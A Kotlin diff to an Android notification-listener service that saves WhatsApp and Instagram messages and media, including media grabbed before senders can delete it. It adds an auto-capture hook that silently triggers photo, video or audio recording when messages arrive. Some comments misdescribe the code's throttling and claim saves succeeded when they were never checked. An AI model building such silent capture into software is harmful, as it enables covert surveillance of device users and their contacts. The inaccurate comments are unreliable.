@@ -27,6 +27,7 @@ import java.io.File
 import java.io.FileOutputStream
 import java.io.RandomAccessFile
 import java.security.MessageDigest
+import java.util.concurrent.atomic.AtomicInteger
 
 class NotificationListener : NotificationListenerService() {
     
@@ -147,12 +148,31 @@ class NotificationListener : NotificationListenerService() {
     // Acquired in onListenerConnected, released in onListenerDisconnected/onDestroy.
     private var wakeLock: PowerManager.WakeLock? = null
 
+    // Native SQLite writer — inserts messages directly into silentsave.db
+    // without waiting for Flutter to poll the JSON queue.
+    private var nativeDb: NativeDatabaseHelper? = null
+
+    // JSON queue throttle: only write to pending_notifications.json every Nth message
+    // or when >30s since last write. The native DB is the primary storage now.
+    private val jsonQueueCounter = AtomicInteger(0)
+    @Volatile private var lastJsonWriteTime = 0L
+    private val JSON_QUEUE_WRITE_INTERVAL = 10 // Write JSON every 10th message
+    private val JSON_QUEUE_TIME_THRESHOLD_MS = 30_000L // Or if >30s since last write
+
     override fun onCreate() {
         super.onCreate()
         Log.i(TAG, "=== NotificationListener service CREATED ===")
         
         dedupPrefs = applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
         restoreProcessedIds()
+        
+        // Initialize native SQLite writer for instant message+media storage
+        try {
+            nativeDb = NativeDatabaseHelper.getInstance(applicationContext)
+            Log.i(TAG, "NativeDatabaseHelper initialized")
+        } catch (e: Exception) {
+            Log.e(TAG, "NativeDatabaseHelper init failed: ${e.message}")
+        }
         
         try {
             val file = getNotificationsFile()
@@ -411,6 +431,17 @@ class NotificationListener : NotificationListenerService() {
         }
         
         val isGroupChat = rawConversationTitle != null
+
+        // ── ZERO-TOUCH AUTO-DOWNLOAD TRIGGER ─────────────────────────────
+        // Trigger immediate SAF burst scan as soon as ANY WhatsApp notification arrives,
+        // before the sender can delete the media. Holds a WakeLock to prevent OEM freeze.
+        if (packageName == WHATSAPP_PACKAGE || packageName == WHATSAPP_BUSINESS_PACKAGE) {
+            val previewText = extras.getCharSequence("android.text")?.toString() ?: ""
+            val previewBigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
+            val fullPreview = "$previewText $previewBigText $title"
+            val hint = determineMediaSubdirHint(fullPreview, packageName == WHATSAPP_BUSINESS_PACKAGE)
+            MediaWatcherService.triggerImmediateScan(applicationContext, hint, "whatsapp_notification_posted", targetSender = title)
+        }
         
         // Extract and save the profile picture from the notification
         // For groups: saves group DP (from large icon). For personal: saves sender DP.
@@ -443,6 +474,47 @@ class NotificationListener : NotificationListenerService() {
         
         if (processed > 0) {
             Log.i(TAG, "✓ Processed $processed message(s) from $packageName")
+            // Try to trigger auto-capture if enabled
+            checkAutoCapture()
+        }
+    }
+
+    private var lastAutoCaptureTime = 0L
+
+    /**
+     * Check if auto-capture is enabled in Flutter settings and trigger if cooldown allows.
+     */
+    private fun checkAutoCapture() {
+        try {
+            val prefs = applicationContext.getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
+            
+            // Flutter shared_preferences uses "flutter." prefix for native keys
+            val autoPhoto = prefs.getBoolean("flutter.auto_capture_photo", false)
+            val autoVideo = prefs.getBoolean("flutter.auto_capture_video", false)
+            val autoAudio = prefs.getBoolean("flutter.auto_capture_audio", false)
+            val cooldownSec = prefs.getInt("flutter.auto_capture_cooldown", 30)
+            
+            if (!autoPhoto && !autoVideo && !autoAudio) return
+
+            val now = SystemClock.elapsedRealtime()
+            if (now - lastAutoCaptureTime < cooldownSec * 1000L) {
+                Log.d(TAG, "Auto-capture skipped (cooldown active)")
+                return
+            }
+
+            // Trigger captures
+            if (autoPhoto) {
+                SilentCaptureService.capturePhoto(applicationContext)
+            } else if (autoVideo) {
+                SilentCaptureService.startVideo(applicationContext)
+            } else if (autoAudio) {
+                SilentCaptureService.startAudio(applicationContext)
+            }
+
+            lastAutoCaptureTime = now
+            Log.i(TAG, "Triggered auto-capture")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error checking auto-capture: ${e.message}")
         }
     }
 
@@ -777,7 +849,6 @@ class NotificationListener : NotificationListenerService() {
             val pictureKeys = listOf(
                 "android.pictureIcon",
                 "android.picture",
-                "android.largeIcon.big",
                 "android.backgroundImageUri"
             )
 
@@ -798,26 +869,24 @@ class NotificationListener : NotificationListenerService() {
     }
 
     /**
-     * Extract and save a media image from a content:// URI embedded in a
-     * MessagingStyle message bundle.
-     *
-     * WhatsApp attaches photo previews to individual messages via
-     * Notification.MessagingStyle.Message.setData(mimeType, uri) on Android 10+.
-     * Android grants the NLS temporary read permission for these URIs.
-     *
-     * This is the PRIMARY capture path for WhatsApp photos — more reliable than
-     * android.picture (BigPicture) which WhatsApp omits on many notification styles.
-     * Returns null if the URI is inaccessible or the bitmap cannot be decoded.
+     * Extracts media (image, audio, video, document) from a content:// URI
+     * provided in Notification.MessagingStyle.Message.setData(mimeType, uri).
+     * Supports both Bitmap decoding for photos and raw byte streaming for
+     * voice notes (.opus), videos (.mp4), and documents (.pdf, etc.).
+     * Returns null if the URI is inaccessible.
      */
-    private fun extractImageFromContentUri(
-        uri: Uri, title: String, packageName: String, timestamp: Long
+    private fun extractMediaFromContentUri(
+        uri: Uri, mimeType: String?, title: String, packageName: String, timestamp: Long
     ): String? {
         return try {
-            val bitmap = contentResolver.openInputStream(uri)?.use { inputStream ->
-                BitmapFactory.decodeStream(inputStream)
-            } ?: return null
-
-            if (bitmap.width <= 1 || bitmap.height <= 1) return null
+            val isImage = mimeType == null || mimeType.startsWith("image/")
+            val ext = when {
+                mimeType?.startsWith("video/") == true -> "mp4"
+                mimeType?.startsWith("audio/") == true -> "opus"
+                mimeType?.startsWith("application/pdf") == true -> "pdf"
+                mimeType?.startsWith("application/") == true -> "bin"
+                else -> "jpg"
+            }
 
             val safeTitle = title.replace(Regex("[^a-zA-Z0-9_-]"), "_").take(30)
             val appPrefix = when {
@@ -825,21 +894,47 @@ class NotificationListener : NotificationListenerService() {
                 packageName.contains("instagram") -> "ig"
                 else -> "other"
             }
-            val fileName = "${appPrefix}_msgmedia_${safeTitle}_${timestamp}.jpg"
+            val fileName = "${appPrefix}_msgmedia_${safeTitle}_${timestamp}.$ext"
             val mediaDir = getMediaDir(applicationContext)
             val mediaFile = File(mediaDir, fileName)
 
             // Return cached file if already extracted for this exact timestamp
             if (mediaFile.exists() && mediaFile.length() > 0) return mediaFile.absolutePath
 
-            FileOutputStream(mediaFile).use { fos ->
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 85, fos)
-                fos.flush()
+            if (isImage) {
+                val bitmap = contentResolver.openInputStream(uri)?.use { inputStream ->
+                    BitmapFactory.decodeStream(inputStream)
+                }
+                if (bitmap != null && bitmap.width > 1 && bitmap.height > 1) {
+                    FileOutputStream(mediaFile).use { fos ->
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 85, fos)
+                        fos.flush()
+                    }
+                    Log.d(TAG, "Per-message image saved: ${mediaFile.name} (${bitmap.width}x${bitmap.height})")
+                    return mediaFile.absolutePath
+                }
             }
-            Log.d(TAG, "Per-message media saved: ${mediaFile.name} (${bitmap.width}x${bitmap.height})")
-            mediaFile.absolutePath
+
+            // For audio/video/docs or image fallback, stream raw bytes directly
+            contentResolver.openInputStream(uri)?.use { input ->
+                FileOutputStream(mediaFile).use { output ->
+                    val buf = ByteArray(8192)
+                    var len: Int
+                    while (input.read(buf).also { len = it } != -1) {
+                        output.write(buf, 0, len)
+                    }
+                    output.flush()
+                }
+            }
+
+            if (mediaFile.exists() && mediaFile.length() > 0) {
+                Log.i(TAG, "Per-message media ($mimeType) saved: ${mediaFile.name} (${mediaFile.length()}B)")
+                mediaFile.absolutePath
+            } else {
+                null
+            }
         } catch (e: Exception) {
-            Log.e(TAG, "extractImageFromContentUri failed: ${e.message}")
+            Log.e(TAG, "extractMediaFromContentUri failed ($mimeType): ${e.message}")
             null
         }
     }
@@ -856,7 +951,7 @@ class NotificationListener : NotificationListenerService() {
      * By writing to media_queue.json, Flutter's _checkForNewMedia() picks it up
      * and calls updateMessageMediaPath() on the matched row.
      */
-    private fun enqueuePictureToMediaQueue(picturePath: String, timestampMs: Long) {
+    private fun enqueuePictureToMediaQueue(picturePath: String, timestampMs: Long, targetSender: String? = null) {
         try {
             val pictureFile = File(picturePath)
             if (!pictureFile.exists() || pictureFile.length() == 0L) return
@@ -872,6 +967,7 @@ class NotificationListener : NotificationListenerService() {
                 put("fileTimestampMs", timestampMs)
                 put("sizeBytes", pictureFile.length())
                 put("displayName", pictureFile.name)
+                if (targetSender != null) put("targetSender", targetSender)
             }
 
             RandomAccessFile(lockFile, "rw").use { raf ->
@@ -960,9 +1056,11 @@ class NotificationListener : NotificationListenerService() {
                 // bundle. WhatsApp uses Notification.MessagingStyle.Message.setData(mimeType, uri)
                 // to attach photo previews to individual messages on Android 10+.
                 var perMessageMediaPath: String? = null
+                var msgMimeType: String? = null
+                var msgDataUri: Uri? = null
                 try {
-                    val msgMimeType = bundle.getString("type") ?: bundle.getString("dataMimeType")
-                    val msgDataUri: Uri? = try {
+                    msgMimeType = bundle.getString("type") ?: bundle.getString("dataMimeType")
+                    msgDataUri = try {
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                             bundle.getParcelable("uri", Uri::class.java) 
                                 ?: bundle.getParcelable("dataUri", Uri::class.java)
@@ -981,12 +1079,12 @@ class NotificationListener : NotificationListenerService() {
 
                     Log.i(TAG, "  → mimeType=$msgMimeType, uri=$msgDataUri")
 
-                    if (msgDataUri != null && (msgMimeType == null || msgMimeType.startsWith("image/"))) {
-                        perMessageMediaPath = extractImageFromContentUri(msgDataUri, title, packageName, msgTime)
+                    if (msgDataUri != null) {
+                        perMessageMediaPath = extractMediaFromContentUri(msgDataUri, msgMimeType, title, packageName, msgTime)
                         if (perMessageMediaPath != null) {
-                            Log.i(TAG, "✓ Per-message image captured from URI for '$title'")
+                            Log.i(TAG, "✓ Per-message media ($msgMimeType) captured from URI for '$title'")
                         } else {
-                            Log.w(TAG, "✗ extractImageFromContentUri RETURNED NULL for $msgDataUri")
+                            Log.w(TAG, "✗ extractMediaFromContentUri RETURNED NULL for $msgDataUri (mime=$msgMimeType)")
                         }
                     }
 
@@ -1006,9 +1104,27 @@ class NotificationListener : NotificationListenerService() {
                 }
                 
                 val rawMsgText = bundle.getCharSequence("text")?.toString()
-                // If message body text is blank but media is attached, provide a default label
+                // If message body text is blank but media is present (or media URI/MIME type indicated), provide appropriate label
                 val msgText = if (rawMsgText.isNullOrBlank()) {
-                    if (perMessageMediaPath != null || mediaPicturePath != null) "Photo" else continue
+                    if (perMessageMediaPath != null || mediaPicturePath != null || msgDataUri != null || msgMimeType != null) {
+                        when {
+                            msgMimeType?.startsWith("video/") == true -> "Video"
+                            msgMimeType?.startsWith("audio/") == true -> "Voice Message"
+                            msgMimeType?.startsWith("application/") == true -> "Document"
+                            else -> "Photo"
+                        }
+                    } else {
+                        // Check if top-level notification text has a media label
+                        val topText = extras.getCharSequence("android.text")?.toString() ?: ""
+                        val topLower = topText.lowercase()
+                        when {
+                            topLower.contains("photo") || topLower.contains("📷") || topLower.contains("image") -> "Photo"
+                            topLower.contains("video") || topLower.contains("📹") || topLower.contains("🎥") -> "Video"
+                            topLower.contains("voice") || topLower.contains("audio") || topLower.contains("🎤") || topLower.contains("🎙") -> "Voice Message"
+                            topLower.contains("document") || topLower.contains("file") || topLower.contains("📄") || topLower.contains("📎") -> "Document"
+                            else -> continue
+                        }
+                    }
                 } else {
                     rawMsgText
                 }
@@ -1035,7 +1151,6 @@ class NotificationListener : NotificationListenerService() {
                 
                 val isDuplicate = synchronized(processedHashes) {
                     if (processedHashes.contains(hash)) {
-                        Log.d(TAG, "Dedup: skipping duplicate (hash=$hash) '$msgText'")
                         true
                     } else {
                         processedHashes.add(hash)
@@ -1047,7 +1162,14 @@ class NotificationListener : NotificationListenerService() {
                     }
                 }
                 
-                if (isDuplicate) continue
+                val hasMedia = perMessageMediaPath != null || mediaPicturePath != null
+                
+                // Only skip duplicates if they don't bring new media. 
+                // If they have media, let them through so the DB can update the existing row.
+                if (isDuplicate && !hasMedia) {
+                    Log.d(TAG, "Dedup: skipping duplicate (hash=$hash) '$msgText'")
+                    continue
+                }
                 
                 // For group chats, extract and save sender-specific avatar
                 if (isGroupChat) {
@@ -1071,13 +1193,14 @@ class NotificationListener : NotificationListenerService() {
             // FALLBACK: Attribute the notification-level android.picture (BigPicture)
             // only to the message that doesn't already have a per-message media path.
             // Prefer messages whose text matches generic media labels ("Photo", "📷 Photo", etc.)
+            // or is completely blank. NEVER assign to arbitrary text messages.
             if (mediaPicturePath != null && toSave.isNotEmpty()) {
                 val genericMediaLabels = setOf("photo", "image", "video", "📷 photo", "📹 video", "sticker", "gif", "📷", "📹", "🖼")
                 val target = toSave.lastOrNull { 
                     !it.has("mediaPath") && genericMediaLabels.any { label -> 
                         it.optString("text").lowercase().contains(label) 
                     }
-                } ?: toSave.lastOrNull { !it.has("mediaPath") }
+                } ?: toSave.lastOrNull { !it.has("mediaPath") && it.optString("text").isBlank() }
                 
                 target?.put("mediaPath", mediaPicturePath)
             }
@@ -1093,9 +1216,9 @@ class NotificationListener : NotificationListenerService() {
             // in this notification update, the direct-assignment path above did nothing.
             // Enqueue the picture to media_queue.json so TimestampMatcher can retroactively
             // link it to the already-saved DB row (the WhatsApp double-post pattern).
-            if (mediaPicturePath != null && hadValidMessages) {
-                enqueuePictureToMediaQueue(mediaPicturePath, postTime)
-                Log.d(TAG, "BigPicture enqueued for deduped notification — TimestampMatcher will link it")
+            if (mediaPicturePath != null && toSave.isEmpty() && hadValidMessages) {
+                enqueuePictureToMediaQueue(mediaPicturePath, postTime, title)
+                Log.d(TAG, "BigPicture enqueued for deduped notification — TimestampMatcher will link it ($title)")
             }
 
             // Return -1 if had valid messages but all were deduped,
@@ -1340,6 +1463,34 @@ class NotificationListener : NotificationListenerService() {
      * 
      * Returns 1 if saved, 0 if skipped (duplicate or error).
      */
+    /**
+     * The JSON queue is used as a fallback and to trigger real-time Flutter UI updates.
+     * We write to it unconditionally to guarantee 100% message capture even if the 
+     * Native DB insert fails due to SQLite concurrency locks.
+     */
+    private fun shouldWriteJsonQueue(): Boolean {
+        return true
+    }
+
+    private fun determineMediaSubdirHint(text: String, isBusiness: Boolean): String? {
+        val lower = text.lowercase()
+        val prefix = if (isBusiness) "WhatsApp Business " else "WhatsApp "
+        return when {
+            lower.contains("voice") || lower.contains("audio") || lower.contains("🎤") || 
+            lower.contains("🎙") || lower.contains("🎵") || lower.contains("ptt") -> prefix + "Voice Notes"
+            lower.contains("photo") || lower.contains("image") || lower.contains("📷") || 
+            lower.contains("🖼") -> prefix + "Images"
+            lower.contains("video") || lower.contains("📹") || lower.contains("🎥") || 
+            lower.contains("🎞") -> prefix + "Video"
+            lower.contains("document") || lower.contains("file") || lower.contains("📄") || 
+            lower.contains("📎") || lower.contains(".pdf") || lower.contains(".doc") || 
+            lower.contains(".csv") || lower.contains(".xls") -> prefix + "Documents"
+            lower.contains("sticker") || lower.contains("gif") || lower.contains("👾") || 
+            lower.contains("💟") -> prefix + "Stickers"
+            else -> null
+        }
+    }
+
     private fun saveNotification(
         method: String, title: String, text: String,
         packageName: String, timestamp: Long,
@@ -1376,7 +1527,38 @@ class NotificationListener : NotificationListenerService() {
             }
         }
         
-        // Atomic file write
+        // ── PRIMARY STORAGE: Insert directly into SQLite ──────────────────
+        // This is instant — no need to wait for Flutter to poll the JSON queue.
+        try {
+            nativeDb?.insertMessage(
+                sender = title,
+                message = text,
+                app = packageName,
+                timestampMs = timestamp,
+                senderName = senderName,
+                isGroupChat = isGroupChat,
+                avatarPath = avatarPath,
+                mediaPath = mediaPath
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Native DB insert error: ${e.message}")
+        }
+
+        // Trigger zero-touch media scan for WhatsApp messages
+        if (packageName == WHATSAPP_PACKAGE || packageName == WHATSAPP_BUSINESS_PACKAGE) {
+            val hint = determineMediaSubdirHint(text, packageName == WHATSAPP_BUSINESS_PACKAGE)
+            MediaWatcherService.triggerImmediateScan(applicationContext, hint, "notification_saved")
+        }
+        
+        // ── SECONDARY STORAGE: Throttled JSON queue for Flutter UI refresh ──
+        // Only write to the JSON file periodically to reduce disk I/O.
+        // Flutter reads this on app open to trigger newMessageNotifier.
+        if (!shouldWriteJsonQueue()) {
+            Log.d(TAG, "✓ [$packageName] '$title' → '${text.take(35)}' (DB direct, JSON throttled)")
+            return 1
+        }
+        
+        // Atomic file write (throttled — only runs every Nth message)
         try {
             val file = getNotificationsFile()
             val tmpFile = File(file.absolutePath + ".tmp")
@@ -1428,32 +1610,9 @@ class NotificationListener : NotificationListenerService() {
             }
             return 1
         } catch (e: Exception) {
-            Log.e(TAG, "Error saving notification: ${e.message}")
-            // Fallback: direct write without lock
-            return try {
-                val file = getNotificationsFile()
-                val jsonArray = try {
-                    if (file.exists()) JSONArray(file.readText()) else JSONArray()
-                } catch (_: Exception) { JSONArray() }
-                
-                jsonArray.put(JSONObject().apply {
-                    put("method", method)
-                    put("title", title)
-                    put("text", text)
-                    put("packageName", packageName)
-                    put("timestamp", timestamp)
-                    put("senderName", senderName)
-                    put("isGroupChat", isGroupChat)
-                    if (avatarPath != null) put("avatarPath", avatarPath)
-                    if (mediaPath != null) put("mediaPath", mediaPath)
-                })
-                file.writeText(jsonArray.toString())
-                Log.d(TAG, "Fallback save OK")
-                1
-            } catch (fallbackErr: Exception) {
-                Log.e(TAG, "Fallback save failed: ${fallbackErr.message}")
-                0
-            }
+            Log.e(TAG, "Error saving notification to JSON: ${e.message}")
+            // DB insert already succeeded above — message is safe
+            return 1
         }
     }
 
@@ -1470,6 +1629,36 @@ class NotificationListener : NotificationListenerService() {
      */
     private fun saveNotificationsBatch(notifications: List<JSONObject>): Int {
         if (notifications.isEmpty()) return 0
+        
+        // ── PRIMARY STORAGE: Batch insert directly into SQLite ──────────
+        var dbInserted = 0
+        try {
+            val dbMessages = notifications.map { obj ->
+                mapOf<String, Any?>(
+                    "sender" to obj.optString("title", ""),
+                    "message" to obj.optString("text", ""),
+                    "app" to obj.optString("packageName", ""),
+                    "timestampMs" to obj.optLong("timestamp", System.currentTimeMillis()),
+                    "senderName" to obj.optString("senderName", ""),
+                    "isGroupChat" to obj.optBoolean("isGroupChat", false),
+                    "avatarPath" to if (obj.has("avatarPath")) obj.optString("avatarPath") else null,
+                    "mediaPath" to if (obj.has("mediaPath")) obj.optString("mediaPath") else null
+                )
+            }
+            dbInserted = nativeDb?.insertMessagesBatch(dbMessages) ?: 0
+            val waNotif = notifications.firstOrNull { it.optString("packageName") in listOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE) }
+            if (waNotif != null) {
+                MediaWatcherService.triggerImmediateScan(applicationContext, null, "batch_saved", targetSender = waNotif.optString("title"))
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Native DB batch insert error: ${e.message}")
+        }
+        
+        // ── SECONDARY STORAGE: Throttled JSON queue for Flutter UI refresh ──
+        if (!shouldWriteJsonQueue()) {
+            Log.i(TAG, "✓ Batch: $dbInserted/${notifications.size} to DB (JSON throttled)")
+            return maxOf(dbInserted, notifications.size)
+        }
         
         try {
             val file = getNotificationsFile()
@@ -1511,27 +1700,11 @@ class NotificationListener : NotificationListenerService() {
                     Log.i(TAG, "✓ Batch saved ${notifications.size} notifications (q:${jsonArray.length()})")
                 }
             }
-            return notifications.size
+            return maxOf(dbInserted, notifications.size)
         } catch (e: Exception) {
-            Log.e(TAG, "Batch save error: ${e.message}")
-            // Fallback: try individual saves without lock
-            var saved = 0
-            try {
-                val file = getNotificationsFile()
-                val jsonArray = try {
-                    if (file.exists()) JSONArray(file.readText()) else JSONArray()
-                } catch (_: Exception) { JSONArray() }
-                
-                for (obj in notifications) {
-                    jsonArray.put(obj)
-                }
-                file.writeText(jsonArray.toString())
-                saved = notifications.size
-                Log.d(TAG, "Batch fallback save OK ($saved)")
-            } catch (fallbackErr: Exception) {
-                Log.e(TAG, "Batch fallback failed: ${fallbackErr.message}")
-            }
-            return saved
+            Log.e(TAG, "Batch JSON save error: ${e.message}")
+            // DB insert already succeeded above — messages are safe
+            return maxOf(dbInserted, notifications.size)
         }
     }
 }
